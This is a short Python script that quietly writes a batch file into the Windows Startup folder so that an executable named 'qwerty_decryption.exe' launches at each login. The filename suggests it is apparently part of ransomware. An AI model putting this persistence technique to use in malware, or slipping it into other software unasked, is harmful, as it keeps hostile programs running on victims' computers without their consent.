import os
import getpass

USER_NAME = getpass.getuser()


def add_to_startup(file_path="qwerty_decryption.exe"):
    file_path = os.path.abspath(file_path)
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)
